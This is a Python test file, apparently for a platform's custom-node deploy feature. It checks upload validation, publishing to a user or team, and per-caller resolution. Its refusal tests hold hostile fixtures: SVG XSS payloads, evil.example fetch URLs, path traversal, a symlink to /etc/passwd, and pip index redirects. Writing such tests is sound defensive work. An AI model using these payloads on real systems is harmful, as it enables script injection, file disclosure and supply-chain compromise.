# =============================================================================
# MIT License
# Copyright (c) 2026 Aparavi Software AG
# =============================================================================

"""
Nodes on the deploy rail: upload, publish to @me or a team, resolve per caller.

The account's real file backend runs over a temporary store, the same wiring
an OSS server uses; only the connection is a stand-in (the same shape as
test_app_deploy's _FakeConn).
"""

import contextlib
import io
import json
import stat
import zipfile
from types import SimpleNamespace

import pytest

from ai.account import account
from ai.account import node_deploy
from ai.account.store import Store
from ai.common.node_packages import (
    NodeNotEntitled,
    NodeNotFound,
    NodePackageInvalid,
    NodeRegistryUnavailable,
    NodeVersionMismatch,
)

TEAM = {'id': 't1', 'name': 'research'}

# HTML parsing turns the instruction into a comment and lets the img out of the svg
PI_BREAKOUT = '<svg xmlns="http://www.w3.org/2000/svg"><?x ><img/src/onerror=alert(document.domain)>?></svg>'


class _Conn:
    """A connection with an account: the response builders and the identity the handlers read."""

    def __init__(self, user_id='u1', teams=(TEAM,), developer_id='acme'):
        self._account_info = SimpleNamespace(
            userId=user_id,
            displayName=user_id,
            email=f'{user_id}@example.com',
            organization={'id': 'org1', 'teams': list(teams), 'developerId': developer_id},
        )
        self._server = SimpleNamespace()

    def build_response(self, request, body=None):
        return {'success': True, 'body': body or {}}

    def build_error(self, request, message):
        return {'success': False, 'message': message}


def _package(module='acme__echo', services=None, files=None, marker=None, symlink=None):
    """A .rrnode: one folder named after the module, with its marker and a services.json."""
    node_id = module.replace('__', '.', 1)
    definition = {'protocol': f'{node_id}://', 'node': 'python', 'path': f'nodes.{module}', 'icon': 'echo.svg'}
    contents = {
        '.rrnode': json.dumps(marker if marker is not None else {'name': module, 'contract': 1}),
        'services.json': json.dumps({**definition, **(services or {})}),
        'echo.svg': '<svg/>',
        'IGlobal.py': '',
        **(files or {}),
    }
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w') as archive:
        for name, text in contents.items():
            if text is not None:
                archive.writestr(name if name.startswith('../') or '/' in name else f'{module}/{name}', text)
        if symlink:
            link = zipfile.ZipInfo(f'{module}/{symlink}')
            link.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(link, '/etc/passwd')
    return buffer.getvalue()


@pytest.fixture
def rail(monkeypatch, tmp_path):
    """The account's real deployments backend and file store over a temp folder."""
    monkeypatch.setenv('RR_STORE_URL', f'filesystem://{tmp_path}')
    monkeypatch.delenv('RR_NODE_RAIL_ENABLED', raising=False)
    Store.reset()
    monkeypatch.setattr(account, '_deployments_backend', None)
    monkeypatch.setattr(node_deploy, '_catalogue', {})
    yield
    Store.reset()


async def _add(conn, data):
    return await node_deploy.handle_node_add(conn, {'arguments': {'data': data}})


async def _deploy(conn, **arguments):
    return await node_deploy.handle_deploy_node(conn, {'arguments': {'nodeId': 'acme.echo', **arguments}})


async def _published(version_target='@me', conn=None):
    """Add acme.echo and publish its first version to one target."""
    conn = conn or _Conn()
    await _add(conn, _package())
    return await _deploy(conn, subcommand='publish', version=1, target=version_target)


# =============================================================================
# UPLOAD
# =============================================================================


@pytest.mark.asyncio
async def test_a_package_is_added_as_a_private_node_version_with_its_bytes_stored(rail):
    data = _package()

    reply = await _add(_Conn(), data)

    assert reply['body']['artifact']['version'] == 1
    (entry,) = await account.deployments_versions('org1', 'acme.echo')
    assert entry['kind'] == 'node' and entry['state'] == 'private'
    assert entry['metadata']['node']['module'] == 'acme__echo'
    assert entry['metadata']['node']['icons'] == {'echo.svg': '<svg/>'}
    row = {
        'appId': 'acme.echo',
        'version': 1,
        'artifactPath': entry['artifactPath'],
        'snapshot': entry['metadata']['node'],
    }
    assert await node_deploy.read_package('org1', 'u1', row) == data


@pytest.mark.parametrize(
    'package, refusal',
    [
        (lambda: _package(services={'node': 'cpp'}), r'a C\+\+ node cannot be uploaded'),
        (lambda: _package(services={'protocol': 'acme.other://'}), 'protocol must be acme.echo://'),
        (lambda: _package(services={'path': 'nodes.elsewhere'}), 'path must be nodes.acme__echo'),
        (lambda: _package(module='other__echo'), 'must be acme.<name>'),
        (lambda: _package(module='webhook'), 'must be acme.<name>'),
        (lambda: _package(files={'../escape.py': ''}), 'unsafe path'),
        (lambda: _package(files={'other/stray.py': ''}), 'one folder, the node'),
        (lambda: _package(symlink='link'), 'symlink'),
        (lambda: _package(marker={}, files={'.rrnode': None}), 'no .rrnode marker'),
        (lambda: _package(files={'services.json': None}), 'no services.json'),
        (lambda: _package(services={'icon': '../../icon.svg'}), 'must be a file inside the node'),
        (lambda: _package(services={'icon': 'missing.svg'}), 'is not in the package'),
        (lambda: _package(files={'echo.svg': '<svg><script>alert(1)</script></svg>'}), 'holds <script>'),
        (lambda: _package(files={'echo.svg': '<svg><image href="#x" onerror="alert(1)"/></svg>'}), 'sets onerror'),
        (
            lambda: _package(files={'echo.svg': '<svg><foreignObject><div/></foreignObject></svg>'}),
            'holds <foreignobject>',
        ),
        (lambda: _package(files={'echo.svg': '<svg><use href="javascript:alert(1)"/></svg>'}), 'sets href'),
        (lambda: _package(files={'echo.svg': PI_BREAKOUT}), 'other than SVG elements'),
        (lambda: _package(files={'echo.svg': '<svg><style>body{display:none}</style></svg>'}), 'holds <style>'),
        (lambda: _package(files={'echo.svg': '<svg><rect fill="url(https://evil.example/x)"/></svg>'}), 'sets fill'),
        (lambda: _package(files={'echo.svg': '<!DOCTYPE svg [<!ENTITY a "a">]><svg/>'}), 'other than SVG elements'),
        (lambda: _package(files={'echo.svg': '<svg><image href="https://evil.example/x.png"/></svg>'}), 'sets href'),
        (
            lambda: _package(files={'requirements.txt': '-i https://evil.example/simple\nrequests'}),
            'not a package name',
        ),
        (lambda: _package(files={'requirements.txt': 'pkg @ https://evil.example/pkg.whl'}), 'not a package name'),
        (lambda: _package(files={'requirements.txt': './vendor/pkg'}), 'not a package name'),
        (lambda: _package(files={'requirements.txt': 'pkg @ file:/tmp/pkg'}), 'not a package name'),
        (lambda: _package(files={'REQUIREMENTS.TXT': '--index-url https://evil.example/simple'}), 'not a package name'),
        (lambda: _package(files={'requirements.txt': 'C:\\wheels\\pkg.whl'}), 'not a package name'),
        (lambda: _package(files={'services.json': '{"protocol": '}), 'is not valid JSON'),
        (lambda: _package(marker=['not', 'an', 'object']), 'is not a JSON object'),
        (
            lambda: _package(files={'echo.svg': None, 'C:evil.svg': '<svg/>'}, services={'icon': 'C:evil.svg'}),
            'path with',
        ),
    ],
    ids=[
        'cpp',
        'protocol',
        'path',
        'outside-namespace',
        'bare-built-in',
        'traversal',
        'two-folders',
        'symlink',
        'no-marker',
        'no-services',
        'icon-dotdot',
        'icon-missing',
        'icon-script',
        'icon-handler',
        'icon-foreign-object',
        'icon-javascript-url',
        'icon-processing-instruction',
        'icon-style',
        'icon-outside-url',
        'icon-doctype',
        'icon-outside-image',
        'requirement-index',
        'requirement-url',
        'requirement-local-path',
        'requirement-file',
        'requirement-uppercase-file',
        'requirement-windows-path',
        'services-not-json',
        'marker-not-object',
        'windows-drive-entry',
    ],
)
@pytest.mark.asyncio
async def test_a_hostile_or_malformed_package_is_refused_and_adds_no_version(rail, package, refusal):
    with pytest.raises(NodePackageInvalid, match=refusal):
        await _add(_Conn(), package())

    assert await account.deployments_versions('org1', 'acme.echo') == []


@pytest.mark.asyncio
async def test_a_connection_without_a_user_can_neither_upload_nor_publish(rail):
    anonymous = _Conn()
    anonymous._account_info = None

    with pytest.raises(NodePackageInvalid, match='registered developer id'):
        await _add(anonymous, _package())
    published = await _deploy(anonymous, subcommand='publish', version=1, target='@me')

    assert not published['success'] and 'developer namespace' in published['message']
    assert await account.deployments_versions('org1', 'acme.echo') == []


def test_an_icon_that_is_only_a_drawing_is_kept():
    svg = (
        '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
        '<defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs>'
        '<rect fill="url(#g)" style="opacity:.5"/><use xlink:href="#g"/>'
        '<image href="data:image/png;base64,iVBORw0KGgo="/></svg>'
    )

    node = node_deploy.inspect_package(_package(files={'echo.svg': svg}), 'acme')

    assert node['icons'] == {'echo.svg': svg}


@pytest.mark.asyncio
async def test_a_package_over_the_size_limit_is_refused(rail, monkeypatch):
    monkeypatch.setattr(node_deploy, '_ZIP_MAX_ZIPPED', 10)

    with pytest.raises(NodePackageInvalid, match='over the'):
        await _add(_Conn(), _package())


@pytest.mark.asyncio
async def test_a_package_for_another_node_contract_is_refused(rail):
    with pytest.raises(NodeVersionMismatch):
        await _add(_Conn(), _package(marker={'name': 'acme__echo', 'contract': 2}))


@pytest.mark.asyncio
async def test_an_org_without_a_developer_id_cannot_upload(rail):
    with pytest.raises(NodePackageInvalid, match='registered developer id'):
        await _add(_Conn(developer_id=None), _package())


# =============================================================================
# PUBLISH
# =============================================================================


@pytest.mark.asyncio
@pytest.mark.parametrize(
    'target, reached, not_reached',
    [
        ('@me', _Conn(), _Conn(user_id='u2', teams=())),
        ('@team/research', _Conn(user_id='u2'), _Conn(user_id='u3', teams=())),
    ],
    ids=['me', 'team'],
)
async def test_a_published_version_reaches_its_rung_and_nobody_else(rail, target, reached, not_reached):
    assert (await _published(target))['success']

    assert list(await node_deploy.visible_nodes(reached)) == ['acme.echo']
    assert await node_deploy.visible_nodes(not_reached) == {}


@pytest.mark.asyncio
@pytest.mark.parametrize(
    'order', [('@team/research', '@me'), ('@me', '@team/research')], ids=['team-first', 'me-first']
)
async def test_the_callers_own_rung_wins_over_their_team(rail, order):
    conn = _Conn()
    await _add(conn, _package())
    await _add(conn, _package(files={'IGlobal.py': '# v2'}))
    versions = {'@team/research': 1, '@me': 2}
    for target in order:
        await _deploy(conn, subcommand='publish', version=versions[target], target=target)

    assert (await node_deploy.visible_nodes(conn))['acme.echo']['version'] == 2
    assert (await node_deploy.visible_nodes(_Conn(user_id='u2')))['acme.echo']['version'] == 1


@pytest.mark.asyncio
async def test_a_disabled_binding_serves_nobody(rail):
    await _published('@me')

    await account.publish_set_state(
        'org1', 'node', 'acme.echo', {'type': 'user', 'id': 'u1'}, 'disabled', {'userId': 'u1'}
    )

    assert await node_deploy.visible_nodes(_Conn()) == {}


@pytest.mark.asyncio
async def test_a_bound_version_that_later_failed_serves_nobody(rail):
    await _published('@me')

    await account.set_artifact_state('org1', 'acme.echo', 1, 'failed', {'userId': 'u1'})

    assert await node_deploy.visible_nodes(_Conn()) == {}


@pytest.mark.asyncio
@pytest.mark.parametrize('target', ['@public', '@org'])
async def test_a_node_cannot_be_published_beyond_the_callers_teams(rail, target):
    conn = _Conn()
    await _add(conn, _package())

    with pytest.raises(ValueError) if target == '@org' else contextlib.nullcontext():
        reply = await _deploy(conn, subcommand='publish', version=1, target=target)
        assert not reply['success']

    assert await account.publish_of_app('org1', 'node', 'acme.echo') == []


@pytest.mark.asyncio
async def test_only_the_first_uploader_changes_a_node(rail):
    await _published('@team/research')
    teammate = _Conn(user_id='u2')

    added = await _add(teammate, _package(files={'IGlobal.py': '# replaced'}))
    published = await _deploy(teammate, subcommand='publish', version=1, target='@me')
    unpublished = await _deploy(teammate, subcommand='unpublish', target='@team/research')

    for reply in (added, published, unpublished):
        assert not reply['success'] and 'belongs to u1' in reply['message']
    assert len(await account.deployments_versions('org1', 'acme.echo')) == 1
    assert (await node_deploy.visible_nodes(teammate))['acme.echo']['version'] == 1
    assert (await _add(_Conn(), _package(files={'IGlobal.py': '# v2'})))['success']


@pytest.mark.asyncio
async def test_a_failed_version_cannot_be_published(rail):
    conn = _Conn()
    await _add(conn, _package())
    await account.set_artifact_state('org1', 'acme.echo', 1, 'failed', {'userId': 'u1'})

    reply = await _deploy(conn, subcommand='publish', version=1, target='@me')

    assert not reply['success'] and 'failed' in reply['message']


@pytest.mark.asyncio
async def test_a_node_outside_the_namespace_cannot_be_published(rail):
    reply = await node_deploy.handle_deploy_node(
        _Conn(developer_id='other'), {'arguments': {'nodeId': 'acme.echo', 'subcommand': 'publish', 'version': 1}}
    )

    assert not reply['success'] and 'developer namespace' in reply['message']


@pytest.mark.asyncio
async def test_unpublishing_takes_the_node_away(rail):
    conn = _Conn()
    await _published('@me', conn)

    await _deploy(conn, subcommand='unpublish', target='@me')

    assert await node_deploy.visible_nodes(conn) == {}


# =============================================================================
# RESOLVE
# =============================================================================


@pytest.mark.asyncio
async def test_a_pipeline_resolves_only_its_published_nodes(rail):
    await _published('@me')

    rows = await node_deploy.resolve_nodes('org1', 'u1', [], ['webhook', 'acme.echo', 'response'])

    assert list(rows) == ['acme.echo'] and rows['acme.echo']['snapshot']['module'] == 'acme__echo'


@pytest.mark.asyncio
async def test_a_node_not_published_to_the_caller_is_not_entitled(rail):
    await _published('@me')

    with pytest.raises(NodeNotEntitled):
        await node_deploy.resolve_nodes('org1', 'u2', [], ['acme.echo'])


@pytest.mark.asyncio
async def test_a_node_nobody_uploaded_is_not_found(rail):
    with pytest.raises(NodeNotFound):
        await node_deploy.resolve_nodes('org1', 'u1', [], ['acme.nothing'])


@pytest.mark.asyncio
async def test_a_registry_that_does_not_answer_refuses_a_published_node_but_not_the_catalogue(rail, monkeypatch):
    async def down(*args):
        raise OSError('store unreachable')

    monkeypatch.setattr(account, 'publish_list', down)

    with pytest.raises(NodeRegistryUnavailable):
        await node_deploy.resolve_nodes('org1', 'u1', [], ['acme.echo'])
    assert await node_deploy.visible_nodes(_Conn()) == {}


@pytest.mark.asyncio
async def test_switching_the_rail_off_leaves_only_the_release_nodes(rail, monkeypatch):
    await _published('@me')
    monkeypatch.setenv('RR_NODE_RAIL_ENABLED', '0')

    assert await node_deploy.visible_nodes(_Conn()) == {}
    with pytest.raises(NodeNotFound):
        await node_deploy.resolve_nodes('org1', 'u1', [], ['acme.echo'])
    assert await node_deploy.resolve_nodes('org1', 'u1', [], ['webhook']) == {}


@pytest.mark.asyncio
async def test_a_stored_package_that_no_longer_matches_its_digest_is_refused(rail):
    await _published('@me')
    row = (await node_deploy.visible_nodes(_Conn()))['acme.echo']
    await node_deploy._file_store('u1').write(f'{node_deploy._home_of("org1", row)}/{node_deploy.PACKAGE_FILE}', b'x')

    with pytest.raises(NodePackageInvalid):
        await node_deploy.read_package('org1', 'u1', row)


# =============================================================================
# EAAS: LAUNCH, FETCH, CATALOGUE
# =============================================================================


def _control(*providers, user_id='u1'):
    """The launch request start_task resolves nodes from."""
    components = [{'id': f'c{i}', 'provider': p} for i, p in enumerate(providers)]
    return SimpleNamespace(
        pipeline={'components': components}, orgId='org1', client_id=user_id, teamId='', owner_kind=''
    )


@pytest.mark.asyncio
async def test_a_launch_fixes_the_version_of_each_published_node_it_names(rail):
    from ai.modules.task.task_server import _resolve_nodes

    await _published('@me')

    control = _control('webhook', 'acme.echo')
    versions = await _resolve_nodes(control.pipeline, control, _Conn())

    assert list(versions) == ['acme.echo'] and versions['acme.echo']['version'] == 1


@pytest.mark.asyncio
async def test_a_launch_naming_a_node_the_caller_cannot_run_is_refused(rail):
    from ai.modules.task.task_server import _resolve_nodes

    await _published('@me')

    with pytest.raises(NodeNotEntitled) as refused:
        control = _control('acme.echo', user_id='u2')
        await _resolve_nodes(control.pipeline, control, _Conn(user_id='u2', teams=()))
    assert refused.value.code == 'NODE_NOT_ENTITLED'


@pytest.mark.asyncio
async def test_a_run_fetches_the_version_resolved_at_its_launch(rail):
    from ai.modules.task import node_store

    await _published('@me')
    row = (await node_deploy.visible_nodes(_Conn()))['acme.echo']
    run = SimpleNamespace(node_versions={'acme.echo': row}, org_id='org1', client_id='u1')

    reply = await node_store._fetch(run, {'name': 'acme__echo'}, None)

    assert reply.body['name'] == 'acme__echo' and reply.body['sha256'] == row['snapshot']['sha256']
    assert reply.data == _package()


@pytest.mark.asyncio
async def test_a_run_is_refused_a_stored_package_that_was_tampered_with(rail):
    from ai.modules.task import node_store
    from ai.modules.task.task_channel import ChannelRefused

    await _published('@me')
    row = (await node_deploy.visible_nodes(_Conn()))['acme.echo']
    await node_deploy._file_store('u1').write(f'{node_deploy._home_of("org1", row)}/{node_deploy.PACKAGE_FILE}', b'x')
    run = SimpleNamespace(node_versions={'acme.echo': row}, org_id='org1', client_id='u1')

    with pytest.raises(ChannelRefused, match='does not match its digest'):
        await node_store._fetch(run, {'name': 'acme.echo'}, None)


@pytest.mark.asyncio
async def test_a_published_node_registers_with_the_engine_once_per_digest(rail, monkeypatch):
    from ai.modules.task import node_store

    registered = []
    monkeypatch.setattr(node_store.engLib, 'registerServices', registered.append, raising=False)
    monkeypatch.setattr(node_store, '_published', {})
    await _published('@me')
    rows = await node_deploy.visible_nodes(_Conn())

    node_store.register_published(rows)
    node_store.register_published(rows)

    ((definition, path),) = registered[0]
    assert len(registered) == 1 and definition['protocol'] == 'acme.echo://'
    assert path.endswith('services.json')


def test_the_catalogue_shows_a_published_node_only_where_it_is_published():
    from ai.modules.task.commands.cmd_misc import _visible

    assert _visible('webhook', {}) and _visible('acme.echo', {'acme.echo': {}})
    assert not _visible('acme.echo', {})


@pytest.mark.asyncio
async def test_an_icon_that_is_not_text_is_refused(rail):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w') as archive:
        archive.writestr('acme__echo/.rrnode', json.dumps({'name': 'acme__echo', 'contract': 1}))
        archive.writestr(
            'acme__echo/services.json',
            json.dumps({'protocol': 'acme.echo://', 'path': 'nodes.acme__echo', 'icon': 'echo.svg'}),
        )
        archive.writestr('acme__echo/echo.svg', b'\xff\xfe not utf-8')

    with pytest.raises(NodePackageInvalid, match='is not UTF-8 text'):
        await _add(_Conn(), buffer.getvalue())


@pytest.mark.asyncio
async def test_the_catalogue_reads_the_rail_once_a_moment_and_again_after_a_publish(rail, monkeypatch):
    reads = []
    real = account.publish_list

    async def counted(*args):
        reads.append(args)
        return await real(*args)

    monkeypatch.setattr(account, 'publish_list', counted)
    conn = _Conn()
    await _add(conn, _package())

    await node_deploy.visible_nodes(conn)
    assert await node_deploy.visible_nodes(conn) == {} and len(reads) == 1

    await _deploy(conn, subcommand='publish', version=1, target='@me')
    assert list(await node_deploy.visible_nodes(conn)) == ['acme.echo'] and len(reads) == 2


@pytest.mark.asyncio
async def test_a_restart_takes_the_restarters_reach_not_the_launchers(rail):
    from ai.modules.task.task_server import _resolve_nodes

    await _published('@me')
    control = _control('acme.echo')

    with pytest.raises(NodeNotEntitled):
        await _resolve_nodes(control.pipeline, control, _Conn(user_id='u2', teams=()))


@pytest.mark.asyncio
async def test_a_team_run_uses_only_what_is_published_to_the_team(rail):
    from ai.modules.task.task_server import _resolve_nodes

    await _published('@me')
    control = _control('acme.echo')
    control.owner_kind, control.teamId = 'team', TEAM['id']

    with pytest.raises(NodeNotEntitled):
        await _resolve_nodes(control.pipeline, control, _Conn())


@pytest.mark.asyncio
async def test_a_run_is_not_served_a_published_node_it_was_not_launched_with(rail):
    from ai.modules.task import node_store

    await _published('@me')
    run = SimpleNamespace(node_versions={}, org_id='org1', client_id='u1')

    reply = await node_store._fetch(run, {'name': 'acme.echo'}, None)

    assert reply.body == {} and reply.data is None
